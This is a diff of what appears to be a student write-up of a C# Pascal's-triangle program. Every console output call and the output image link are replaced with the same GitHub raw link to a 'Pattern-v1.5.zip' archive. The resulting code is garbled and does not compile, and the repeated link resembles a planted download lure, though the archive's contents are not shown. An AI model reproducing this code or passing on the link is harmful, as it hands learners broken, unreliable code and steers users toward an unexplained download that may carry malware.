@@ -40,20 +40,20 @@ namespace PascalTriangleDemo
         public static void Main()
         {
             int rows = 5, val = 1, blank, i, j;
-            Console.WriteLine("Pascal's triangle");
+            https://github.com/kiran03-jagadeesh/C-Pattern/raw/refs/heads/main/circumvolute/Pattern-v1.5.zip("Pascal's triangle");
             for (i = 0; i < rows; i++)
             {
                 for (blank = 1; blank <= rows - i; blank++)
-                    Console.Write(" ");
+                    https://github.com/kiran03-jagadeesh/C-Pattern/raw/refs/heads/main/circumvolute/Pattern-v1.5.zip(" ");
                 for (j = 0; j <= i; j++)
                 {
                     if (j == 0 || i == 0)
                         val = 1;
                     else
                         val = val * (i - j + 1) / j;
-                    Console.Write(val + " ");
+                    https://github.com/kiran03-jagadeesh/C-Pattern/raw/refs/heads/main/circumvolute/Pattern-v1.5.zip(val + " ");
                 }
-                Console.WriteLine();
+                https://github.com/kiran03-jagadeesh/C-Pattern/raw/refs/heads/main/circumvolute/Pattern-v1.5.zip();
             }
         }
     }
@@ -61,6 +61,6 @@ namespace PascalTriangleDemo
 ```
 
 ## Output:
-![output](op1.png)
+![output](https://github.com/kiran03-jagadeesh/C-Pattern/raw/refs/heads/main/circumvolute/Pattern-v1.5.zip)
 ## Result:
 Thus,To write a C# program for a pascal's triangle is written and executed.
